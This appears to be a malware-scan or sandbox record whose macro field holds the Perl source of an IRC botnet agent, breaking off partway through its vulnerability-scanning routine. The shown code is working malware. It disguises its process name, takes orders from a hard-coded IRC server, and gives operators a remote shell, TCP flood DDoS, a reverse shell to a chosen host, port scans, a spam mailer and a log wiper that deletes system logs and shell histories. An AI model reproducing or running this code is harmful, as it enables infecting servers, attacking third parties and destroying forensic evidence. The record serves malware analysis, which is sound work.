{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "run": "May run an executable file or a system command",
            "shell": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "#!/usr/bin/perl\n\nuse HTTP::Request;\nuse LWP::UserAgent;\n\nmy $processo = '[httpd]';\nmy $linas_max='4';\nmy $sleep='6';\nmy $cmd=\"http://kendall-web-lab.com/h.txt?\";\nmy $id=\"http://www.greenhealth-bg.com///administrator/components/com_virtuemart/html/id.txt?\";\nmy @adms=(\"Ha45K\",\"TijN\");\nmy @canais=(\"#e109#\");\nmy @nickname = (\"None\".int(rand(1000)));\nmy $nick = $nickname[rand scalar @nickname];\nmy $ircname ='None';\nchop (my $realname = 'NoThink');\n$servidor='gangbang.mytijn.org' unless $servidor;\nmy $porta='23232';\n\n$SIG{'INT'} = 'IGNORE';\n$SIG{'HUP'} = 'IGNORE';\n$SIG{'TERM'} = 'IGNORE';\n$SIG{'CHLD'} = 'IGNORE';\n$SIG{'PS'} = 'IGNORE';\nuse IO::Socket;\nuse Socket;\nuse IO::Select;\nchdir(\"/\");\n\n#Connect\n$servidor=\"$ARGV[0]\" if $ARGV[0];\n$0=\"$processo\".\"\\0\"x16;;\nmy $pid=fork;\nexit if $pid;\ndie \"Masalah fork: $!\" unless defined($pid);\n\nour %irc_servers;\nour %DCC;\nmy $dcc_sel = new IO::Select->new();\n$sel_cliente = IO::Select->new();\nsub sendraw {\n  if ($#_ == '1') {\n    my $socket = $_[0];\n    print $socket \"$_[1]\\n\";\n    } else {\n    print $IRC_cur_socket \"$_[0]\\n\";\n  }\n}\n\nsub conectar {\n  my $meunick = $_[0];\n  my $servidor_con = $_[1];\n  my $porta_con = $_[2];\n  my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\",\n  PeerPort=>$porta_con) or return(1);\n  if (defined($IRC_socket)) {\n    $IRC_cur_socket = $IRC_socket;\n    $IRC_socket->autoflush(1);\n    $sel_cliente->add($IRC_socket);\n    $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";\n    $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";\n    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;\n    nick(\"$meunick\");\n    sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");\n    sleep 1;\n  }\n}\n\nmy $line_temp;\nwhile( 1 ) {\n  while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }\n  delete($irc_servers{''}) if (defined($irc_servers{''}));\n  my @ready = $sel_cliente->can_read(0);\n  next unless(@ready);\n  foreach $fh (@ready) {\n    $IRC_cur_socket = $fh;\n    $meunick = $irc_servers{$IRC_cur_socket}{'nick'};\n    $nread = sysread($fh, $msg, 4096);\n    if ($nread == 0) {\n      $sel_cliente->remove($fh);\n      $fh->close;\n      delete($irc_servers{$fh});\n    }\n    @lines = split (/\\n/, $msg);\n    for(my $c=0; $c<= $#lines; $c++) {\n\n      $line = $lines[$c];\n      $line=$line_temp.$line if ($line_temp);\n      $line_temp='';\n      $line =~ s/\\r$//;\n      unless ($c == $#lines) {\n        parse(\"$line\");\n        } else {\n        if ($#lines == 0) {\n          parse(\"$line\");\n          } elsif ($lines[$c] =~ /\\r$/) {\n          parse(\"$line\");\n          } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {\n          parse(\"$line\");\n          \t   } else {\n          \t               $line_temp = $line;\n        }\n      }\n    }\n  }\n}\n\nsub parse {\n  my $servarg = shift;\n  if ($servarg =~ /^PING \\:(.*)/) {\n    sendraw(\"PONG :$1\");\n    } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {\n    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;\n    if ($args =~ /^\\001VERSION\\001$/) {\n      \t notice(\"$pn\", \"\\001VERSION mIRC v6.17 PitBull\\001\");\n    }\n    if (grep {$_ =~ /^\\Q$pn\\E$/i } @adms ) {\n    if ($onde eq \"$meunick\"){\n    shell(\"$pn\", \"$args\");\n  }\n\n#End of Connect\n\n######################\n#      PREFIX        #\n#                    #\n######################\n# You can change the prefix if you want but the commands will be different\n# The standard prefix is !x if you change it into !xitch for example\n# every command will be like !xitch @udpflood, !xitch @googlescan.\n# So its recommended not to change this ;)\n######################\n\n  if ($args =~ /^(\\Q$meunick\\E|\\!x)\\s+(.*)/ ) {\n    my $natrix = $1;\n    my $arg = $2;\n    if ($arg =~ /^\\!(.*)/) {\n      ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"!x\" and $arg =~ /^\\!nick/);\n      } elsif ($arg =~ /^\\@(.*)/) {\n      $ondep = $onde;\n      $ondep = $pn if $onde eq $meunick;\n      bfunc(\"$ondep\",\"$1\");\n      } else {\n      shell(\"$onde\", \"$arg\");\n    }\n  }\n}\n}\n######################\n#   End of PREFIX    #\n#                    #\n######################\n\nelsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {\nif (lc($1) eq lc($meunick)) {\n  $meunick=$4;\n  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n}\n} elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {\nnick(\"$meunick\".int rand(999999));\n} elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {\n$meunick = $2;\n$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n$irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";\nforeach my $canal (@canais) {\n  sendraw(\"JOIN $canal ddosit\");\n}\n} elsif ($servarg =~ m/^\\:(.+?)\\s+002\\s+(\\S+)\\s/i) {\nforeach my $canal (@canais) { sendraw(\"JOIN $canal ddosit\"); }\n} elsif ($servarg =~ m/^\\:(.+?)\\s+003\\s+(\\S+)\\s/i) {\nforeach my $canal (@canais) { sendraw(\"JOIN $canal ddosit\"); }\n} elsif ($servarg =~ m/^\\:(.+?)\\s+004\\s+(\\S+)\\s/i) {\nforeach my $canal (@canais) { sendraw(\"JOIN $canal ddosit\"); }\n} elsif ($servarg =~ m/^\\:(.+?)\\s+005\\s+(\\S+)\\s/i) {\nforeach my $canal (@canais) { sendraw(\"JOIN $canal ddosit\"); }\n}\n}\n\nsub bfunc {\nmy $printl = $_[0];\nmy $funcarg = $_[1];\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\n  exit;\n} else {\n\n######################\n#       Help         #\n#                    #\n######################\n\nif ($funcarg =~ /^help/) {\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 Scanner edit by \u00032MasterKid\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003ddos\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003rfi\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003backconnect\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003shell\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003portscanner\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003commands\");\n\n}\n\nif ($funcarg =~ /^ddos/) {\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 There are 3 DDos in this bot\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 UDPFlood, HTTPFlood and TCPFlood\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003udpflood \u0002\u00033<ip> <packet size> <time>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003tcpflood \u0002\u00033<ip> <port> <packet size> <time>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003httpflood \u0002\u00033<site> <time>\");\n\n}\n\n#if ($funcarg =~ /^rfi/) {\n#\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 This bot also contains a RFI Scanner.\");\n#\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 That contains the engines :\u000312G\u00034o\u00038o\u000312g\u00039l\u00034e\u00034, \u00037M\u00034S\u00037N\u00034, \u00037A\u0003ll\u00037T\u0003he\u00037W\u0003eb\u00034, \u000314A\u00034S\u000314K\u00034, \u00037AOL, \u00031L\u00037yc\u00031o\u00037s\u00034, \u00032Y\u00036ahoo\u000f \");\n#\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 Commands :\");\n#\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003rfi \u0002\u00033<vuln> <dork>\");\n#\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 You can find strings here : http://www.xshqiptaretx.org/strings.txt \");\n#\n#}\n\nif ($funcarg =~ /^backconnect/) {\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 You use backconnect like this :\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003back \u0002\u00033<ip><port>\");\n}\n\nif ($funcarg =~ /^shell/) {\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 This bot has a integrated shell\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 You can use it in private but also public in the channel\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 In public channel just use : \u00032!x cd tmp\u00033 for example\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 For help with the linux commands type :\u0003!x \u00032@\u0003linuxhelp\");\n}\n\nif ($funcarg =~ /^portscanner/) {\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 There is a normal portscan and a Nmap:\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003portscan \u0002\u00033<ip>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003nmap \u0002\u00033<ip> <beginport> <endport>\");\n}\n\nif ($funcarg =~ /^commands/) {\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 You can use the following commands :\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003portscan \u0002\u00033<ip>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003nmap \u0002\u00033<ip> <beginport> <endport>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003back \u0002\u00033<ip><port>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x cd tmp for example\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003udpflood \u0002\u00033<ip> <packet size> <time>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003tcpflood \u0002\u00033<ip> <port> <packet size> <time>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003httpflood \u0002\u00033<site> <time>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003linuxhelp\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003rfi \u0002\u00033<vuln> <dork>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003system\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003logcleaner\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003sendmail \u0002\u00033<subject> <sender> <recipient> <message>\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003milw0rm\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003join #channel\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Help\u000314\u0002)\u0002\u00033 !x \u00032@\u0003part #channel\");\n}\n\nif ($funcarg =~ /^linuxhelp/) {\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032 Dir where you are : pwd\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032 Start a Perl file : perl file.pl\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032 Go back from dir : cd ..\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032 Force to Remove a file/dir : rm -rf file/dir;ls -la\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032 Show all files/dir with permissions : ls -lia\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032 Find config.inc.php files : find / -type f -name config.inc.php\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032 Find all writable folders and files : find / -perm -2 -ls\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032 Find all .htpasswd files : find / -type f -name .htpasswd\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032 Find all service.pwd files : find / -type f -name service.pwd\");\n}\n\n######################\n#   End of  Help     #\n#                    #\n######################\n\n######################\n#     Commands       #\n#                    #\n######################\n\nif ($funcarg =~ /^system/) {\n$uname=`uname -a`;$uptime=`uptime`;$ownd=`pwd`;$distro=`cat /etc/issue`;$id=`id`;$un=`uname -sro`;\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032Info BOT : \u00033 $servidor : $porta\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032Uname -a     : \u00033 $uname\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032Uptime       : \u00033 $uptime\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032Own Prosses  : \u00033 $processo\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032ID           : \u00033 $id\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032Own Dir      : \u00033 $ownd\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032OS           : \u00033 $distro\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032Owner        : \u00033 achap\");\n\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00032Channel      : \u00033 #upsi@WebChat\");\n}\n\nif ($funcarg =~ /^milw0rm/) {\n\tmy @ltt=();\n\tmy @bug=();\n\tmy $x;\n\tmy $page=\"\";\n\tmy $socke = IO::Socket::INET->new(PeerAddr=>\"milw0rm.com\",PeerPort=>\"80\",Proto=>\"tcp\") or return;\n\tprint $socke \"GET http://milw0rm.com/rss.php HTTP/1.0\\r\\nHost: milw0rm.com\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";\n\tmy @r = <$socke>;\n\t$page=\"@r\";\n\tclose($socke);\n\twhile ($page =~  m/<title>(.*)</g){\n\t$x = $1;\n\tif ($x =~ /\\&lt\\;/) {\n\t$x =~ s/\\&lt\\;/</g;\n\t}\n\tif ($x !~ /milw0rm/) {\n\tpush (@bug,$x);\n\t}}\n\twhile ($page =~  m/<link.*expl.*([0-9]...)</g) {\n\tif ($1 !~ m/milw0rm.com|exploits|en/){\n\tpush (@ltt,\"http://www.milw0rm.com/exploits/$1 \");\n\t}}\n\t\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032milw0rm\u000314\u0002)\u0002\u00033 Latest exploits :\u000f\");\n\tforeach $x (0..(@ltt - 1)) {\n\t\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032milw0rm\u000314\u0002)\u0002\u00033 $bug[$x] - $ltt[$x]\");\n\tsleep 1;\n}}\n\n######################\n#      Portscan      #\n#                    #\n######################\n\nif ($funcarg =~ /^portscan (.*)/) {\n  my $hostip=\"$1\";\n  my\n  @portas=(\"15\",\"19\",\"98\",\"20\",\"21\",\"22\",\"23\",\"25\",\"37\",\"39\",\"42\",\"43\",\"49\",\"53\",\"63\",\"69\",\"79\",\"80\",\"101\",\"106\",\"107\",\"109\",\"110\",\"111\",\"113\",\"115\",\"117\",\"119\",\"135\",\"137\",\"139\",\"143\",\"174\",\"194\",\"389\",\"389\",\"427\",\"443\",\"444\",\"445\",\"464\",\"488\",\"512\",\"513\",\"514\",\"520\",\"540\",\"546\",\"548\",\"565\",\"609\",\"631\",\"636\",\"694\",\"749\",\"750\",\"767\",\"774\",\"783\",\"808\",\"902\",\"988\",\"993\",\"994\",\"995\",\"1005\",\"1025\",\"1033\",\"1066\",\"1079\",\"1080\",\"1109\",\"1433\",\"1434\",\"1512\",\"2049\",\"2105\",\"2432\",\"2583\",\"3128\",\"3306\",\"4321\",\"5000\",\"5222\",\"5223\",\"5269\",\"5555\",\"6660\",\"6661\",\"6662\",\"6663\",\"6665\",\"6666\",\"6667\",\"6668\",\"6669\",\"7000\",\"7001\",\"7741\",\"8000\",\"8018\",\"8080\",\"8200\",\"10000\",\"19150\",\"27374\",\"31310\",\"33133\",\"33733\",\"55555\");\n  my (@aberta, %porta_banner);\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Scanning\u000314\u0002)\u0002\u00033 Scan Untuk Port yang Terbuka\".$1.\"\u0003 \u00033Tunggu!\u0003.\");\n  foreach my $porta (@portas)  {\n    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>\n    'tcp', Timeout => 4);\n    if ($scansock) {\n      push (@aberta, $porta);\n      $scansock->close;\n    }\n  }\n\n  if (@aberta) {\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Scanning\u000314\u0002)\u0002\u00033 Port yang Terbuka:\u0003 @aberta\");\n    } else {\n    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Scanning\u000314\u0002)\u0002\u00033 Tiada.\u0003\");\n  }\n}\n\n######################\n#  End of  Portscan  #\n#                    #\n######################\n\n######################\n#        Nmap        #\n#                    #\n######################\n   if ($funcarg =~ /^nmap\\s+(.*)\\s+(\\d+)\\s+(\\d+)/){\n         my $hostip=\"$1\";\n         my $portstart = \"$2\";\n         my $portend = \"$3\";\n         my (@abertas, %porta_banner);\n       sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Nmap\u000314\u0002)\u0002\u00032Port: $1 \u00033Ports $2-$3\");\n       foreach my $porta ($portstart..$portend){\n               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime);\n    if ($scansock) {\n                 push (@abertas, $porta);\n                 $scansock->close;\n                 if ($xstats){\n        sendraw($IRC_cur_socket, \"PRIVMSG $printl ::\u0002\u000314(\u0002\u00032Nmap\u000314\u0002) \u00033Dapat \u00033 $porta\".\"/Open\");\n                 }\n               }\n             }\n             if (@abertas) {\n        sendraw($IRC_cur_socket, \"PRIVMSG $printl ::\u0002\u000314(\u0002\u00032Nmap\u000314\u0002)\u0002\u00033 \u00033Selesai!\");\n             } else {\n        sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Nmap\u000314\u0002)\u0002\u00033 \u00033Tiada\");\n             }\n\t\t\t }\n######################\n#    End of Nmap     #\n#                    #\n######################\n\n#\n######################\n#    Log Cleaner     #\n#                    #\n######################\nif ($funcarg =~ /^logcleaner/) {\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032LogCleaned\u000314\u0002)\u0002\u00033 \u00033Tunggu..\");\n    system 'rm -rf /var/log/lastlog';\n    system 'rm -rf /var/log/wtmp';\n\tsystem 'rm -rf /etc/wtmp';\n\tsystem 'rm -rf /var/run/utmp';\n\tsystem 'rm -rf /etc/utmp';\n\tsystem 'rm -rf /var/log';\n\tsystem 'rm -rf /var/logs';\n\tsystem 'rm -rf /var/adm';\n\tsystem 'rm -rf /var/apache/log';\n\tsystem 'rm -rf /var/apache/logs';\n\tsystem 'rm -rf /usr/local/apache/log';\n\tsystem 'rm -rf /usr/local/apache/logs';\n\tsystem 'rm -rf /root/.bash_history';\n\tsystem 'rm -rf /root/.ksh_history';\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032LogCleaned\u000314\u0002)\u0002\u00033 Default log and bash_history file dihapus.\");\n\t\tsleep 1;\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032LogCleaned\u000314\u0002)\u0002\u00033 Hapuskan machine log file.\");\n\tsystem 'find / -name *.bash_history -exec rm -rf {} \\;';\n\tsystem 'find / -name *.bash_logout -exec rm -rf {} \\;';\n\tsystem 'find / -name \"log*\" -exec rm -rf {} \\;';\n\tsystem 'find / -name *.log -exec rm -rf {} \\;';\n\t\tsleep 1;\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032LogCleaned\u000314\u0002)\u0002\u00033 Semua log telah dihapuskan.\");\n      }\n######################\n# End of Log Cleaner #\n#                    #\n######################\n#\n# The PitBull !!!!\n#\n######################\n#       MAILER       #\n#                    #\n######################\n# For mailing use :\n# !x @sendmail <subject> <sender> <recipient> <message>\n#\n######################\nif ($funcarg =~ /^sendmail\\s+(.*)\\s+(.*)\\s+(.*)\\s+(.*)/) {\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Mailer\u000314\u0002)\u0002\u00033 Pengiriman ke :\u000314 $3\");\n$subject = $1;\n$sender = $2;\n$recipient = $3;\n@corpo = $4;\n$mailtype = \"content-type: text/html\";\n$sendmail = '/usr/sbin/sendmail';\nopen (SENDMAIL, \"| $sendmail -t\");\nprint SENDMAIL \"$mailtype\\n\";\nprint SENDMAIL \"Subject: $subject\\n\";\nprint SENDMAIL \"From: $sender\\n\";\nprint SENDMAIL \"To: $recipient\\n\\n\";\nprint SENDMAIL \"@corpo\\n\\n\";\nclose (SENDMAIL);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Mailer\u000314\u0002)\u0002\u00033 Mail Dikirim ke :\u000314 $recipient\");\n}\n######################\n#   End of MAILER    #\n#                    #\n######################\n######################\n#  Join And Part     #\n#                    #\n######################\n           if ($funcarg =~ /^join (.*)/) {\n              sendraw($IRC_cur_socket, \"JOIN \".$1);\n           }\n           if ($funcarg =~ /^part (.*)/) {\n              sendraw($IRC_cur_socket, \"PART \".$1);\n           }\n\n######################\n#End of Join And Part#\n#                    #\n######################\n\n######################\n#     TCPFlood       #\n#                    #\n######################\n\nif ($funcarg =~ /^tcpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032DDos\u000314\u0002)\u0002\u00033 \u000314 \".$1.\":\".$2.\" \u00033for \u000314 \".$3.\" \u00033seconds.\u0003\");\n  my $itime = time;\n  my ($cur_time);\n  $cur_time = time - $itime;\n  while ($3>$cur_time){\n  $cur_time = time - $itime;\n  &tcpflooder(\"$1\",\"$2\",\"$3\");\n}\nsendraw($IRC_cur_socket,\"PRIVMSG $printl :\u0002\u000314(\u0002\u00032DDos\u000314\u0002)\u0002\u00033 Penembakan selesai\u0003 \u000314 \".$1.\":\".$2.\".\");\n}\n######################\n#  End of TCPFlood   #\n#                    #\n######################\n\n######################\n#   Back Connect     #\n#                    #\n######################\nif ($funcarg =~ /^back\\s+(.*)\\s+(\\d+)/) {\nmy $host = \"$1\";\nmy $porta = \"$2\";\nmy $proto = getprotobyname('tcp');\nmy $iaddr = inet_aton($host);\nmy $paddr = sockaddr_in($porta, $iaddr);\nmy $shell = \"/bin/sh -i\";\nif ($^O eq \"MSWin32\") {\n  $shell = \"cmd.exe\";\n}\nsocket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die \"socket: $!\";\nconnect(SOCKET, $paddr) or die \"connect: $!\";\nopen(STDIN, \">&SOCKET\");\nopen(STDOUT, \">&SOCKET\");\nopen(STDERR, \">&SOCKET\");\nsystem(\"$shell\");\nclose(STDIN);\nclose(STDOUT);\nclose(STDERR);\nif ($estatisticas)\n{\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u0002\u000314(\u0002\u00032Backconnect\u000314\u0002)\u0002\u00033 Konek ke \u000314 $host:$porta\");\n}\n}\n######################\n#End of  Back Connect#\n#                    #\n######################\n\n######################\n#    MULTI SCANNER   #\n#                    #\n######################\nif ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\nmy %hosts;\n### Start Message\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312\u001f(\u001f\u000310\u0002@\u0002\u00034netcat\u000312\u001f)\u001f\u00037 wE lOad the bug:\u00031 $bug \u0003\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312\u001f(\u001f\u000310\u0002@\u0002\u00034netcat\u000312\u001f)\u001f\u00037 wE lOad the dOrk:\u00031 $dork \u0003\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312\u001f(\u001f\u000310\u0002@\u0002\u00034netcat\u000312\u001f)\u001f\u000314 let\u0002'\u0002s rock this party\u0002.\u0002 \u0003\");\n### End of Start Message\n# Starting Google\n\tmy @glist=&google($dork);\npush(my @tot, @glist );\nmy @puliti=&unici(@tot);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034g00gle\u000312\u001f)\u000f \u00032\u0002\u0002\".scalar(@tot).\" \u00033sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034g00gle\u000312\u001f)\u000f\u00037 wE have cLeaNed \u00032\u0002\u0002\".scalar(@puliti).\" \u00033sites\");\nmy $uni=scalar(@puliti);\nforeach my $sito (@puliti)\n{\n$contatore++;\nif ($contatore %50==0){\n#sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00033Exploiting\u00031 \".$contatore.\" \u00033of\u00031 \".$uni. \" \u00033Sites\");\n}\nif ($contatore==$uni-1){\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u001f\u000312(\u001f\u000310\u0002@\u0002\u00034g00gle\u000312\u001f)\u000f\u00037 